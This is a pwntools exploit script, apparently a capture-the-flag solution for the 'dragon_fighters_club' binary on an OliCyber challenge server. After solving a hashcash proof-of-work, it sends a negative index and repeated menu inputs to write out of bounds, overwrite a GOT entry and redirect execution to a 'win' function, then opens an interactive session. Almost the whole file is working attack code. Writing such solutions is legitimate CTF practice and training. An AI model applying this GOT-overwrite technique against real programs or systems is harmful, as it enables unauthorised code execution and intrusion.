#!/usr/bin/env python3
from pwn import *
import subprocess, re

# thanks Chat-GPT
def run_hashcash(bits, resource):
    """
    Run the hashcash command with specified bits and resource.

    Args:
        bits (int): The number of bits for the hashcash stamp.
        resource (str): The resource string for hashcash.

    Returns:
        str: The output of the hashcash command.
    """
    try:
        # Construct the command
        command = ["hashcash", f"-mCb{bits}", resource]
        
        # Run the command and capture the output
        result = subprocess.run(command, check=True, capture_output=True, text=True)
        
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        return f"An error occurred: {e}"
    except FileNotFoundError:
        return "Hashcash is not installed or not found in the PATH."


chall = ELF('./dragon_fighters_club')
if args.REMOTE:
    r = remote('dragonfightersclub.challs.olicyber.it', 38303)
else:
    r = gdb.debug(chall.path, '''
        c
    ''', terminal=['tmux', 'splitw', '-h'])
        
if args.REMOTE:
    for i in range(3):
        r.recvline()
    regex = r'hashcash -mCb(\d+) "(\w+)"' # hashcash -mCb26 "1hJuMUENa4hK"
    bits, resource = re.match(regex, r.recvline().decode()).groups()
    r.recvuntil(b': ')
    r.sendline(run_hashcash(int(bits), resource).encode())
    
WIN = chall.symbols['win']
STCK_FAIL = 0x404050

for i in range(8):
    r.recvuntil(b'> ')
    r.sendline(b'3')
    r.recvuntil(b'> ')
    r.sendline(str(i).encode())
    r.recvuntil(b'?\n')
    r.sendline(str(1 << 24).encode())

# porto il mio valore a circa 0x50000 per poter sovrascrivere la GOT
for i in range(52):
    r.recvuntil(b'> ')
    r.sendline(b'3')
    r.recvuntil(b'> ')
    r.sendline(b'8')
    r.recvuntil(b'?\n')
    r.sendline(str(1 << 24).encode())

r.recvuntil(b'> ')
r.sendline(b'3')
r.recvuntil(b'> ')
r.sendline(b'-5')
r.recvuntil(b'?\n')
r.sendline(str((0x4010b0 - WIN)).encode())

r.recvuntil(b'> ')
r.sendline(b'5')
r.interactive()